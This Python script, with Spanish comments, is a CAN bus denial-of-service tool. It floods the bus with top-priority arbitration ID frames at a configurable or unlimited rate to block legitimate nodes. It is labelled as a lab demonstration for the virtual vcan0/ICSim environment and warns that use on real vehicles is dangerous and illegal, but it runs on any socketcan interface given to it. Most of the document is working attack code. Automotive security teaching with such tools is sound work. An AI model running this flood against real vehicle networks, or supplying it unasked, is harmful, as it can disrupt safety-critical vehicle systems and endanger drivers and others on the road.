#!/usr/bin/env python3
"""
can_dos.py — Demostración de Denegación de Servicio (DoS) en bus CAN.

Inunda el bus con tramas de Arbitration ID de máxima prioridad (0x000 por defecto),
saturando el bus y bloqueando la comunicación de nodos legítimos.

⚠️  ÚNICAMENTE PARA ENTORNOS VIRTUALES (vcan0 + ICSim).
    El uso de esta técnica en vehículos reales es peligroso e ilegal.

Uso:
    python can_dos.py --interface vcan0 --duration 30
    python can_dos.py --interface vcan0 --priority-id 0x001 --duration 10 --rate 5000

Dependencias: python-can (pip install python-can)
"""

import can
import argparse
import time
import sys


def dos_flood(
    interface: str,
    priority_id: int,
    duration: float,
    rate: int,
) -> None:
    print("=" * 60)
    print("  ⚠  DEMOSTRACIÓN DoS — SOLO ENTORNO VIRTUAL ⚠")
    print("=" * 60)
    print(f"  Interfaz    : {interface}")
    print(f"  ID de ataque: 0x{priority_id:03X}")
    print(f"  Duración    : {duration:.0f} s")
    print(f"  Tasa máx.   : {rate} tramas/s")
    print("=" * 60)
    print("  Pulsa Ctrl+C para detener.\n")

    try:
        bus = can.interface.Bus(channel=interface, bustype="socketcan")
    except Exception as e:
        print(f"[!] Error al abrir {interface}: {e}")
        sys.exit(1)

    # Payload fijo — 8 bytes a 0x00
    payload = [0x00] * 8
    msg = can.Message(
        arbitration_id=priority_id,
        data=payload,
        is_extended_id=False,
    )

    interval = 1.0 / rate if rate > 0 else 0
    start = time.monotonic()
    total_sent = 0

    try:
        while time.monotonic() - start < duration:
            iter_start = time.monotonic()
            try:
                bus.send(msg)
                total_sent += 1
            except can.CanError:
                pass

            if total_sent % 1000 == 0:
                elapsed = time.monotonic() - start
                actual_rate = total_sent / elapsed if elapsed > 0 else 0
                print(f"  [{elapsed:5.1f}s] {total_sent:9d} tramas | {actual_rate:.0f} tps")

            if interval > 0:
                elapsed_iter = time.monotonic() - iter_start
                sleep_time = interval - elapsed_iter
                if sleep_time > 0:
                    time.sleep(sleep_time)

    except KeyboardInterrupt:
        print("\n[!] DoS interrumpido.")
    finally:
        bus.shutdown()

    elapsed = time.monotonic() - start
    actual_rate = total_sent / elapsed if elapsed > 0 else 0
    print(f"\n[+] Flood terminado.")
    print(f"    Tramas enviadas : {total_sent}")
    print(f"    Duración        : {elapsed:.1f} s")
    print(f"    Tasa media      : {actual_rate:.0f} tramas/s")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="DoS flooding CAN — ICSim Lab (solo entorno virtual)"
    )
    parser.add_argument("--interface", "-i", default="vcan0")
    parser.add_argument(
        "--priority-id",
        type=lambda x: int(x, 16),
        default=0x000,
        metavar="HEX_ID",
        help="Arbitration ID de alta prioridad para el flood (default: 0x000)",
    )
    parser.add_argument(
        "--duration", "-d", type=float, default=30.0, help="Duración en segundos"
    )
    parser.add_argument(
        "--rate",
        "-r",
        type=int,
        default=10000,
        help="Tramas por segundo (default: 10000; 0 = sin límite)",
    )
    args = parser.parse_args()
    dos_flood(args.interface, args.priority_id, args.duration, args.rate)


if __name__ == "__main__":
    main()
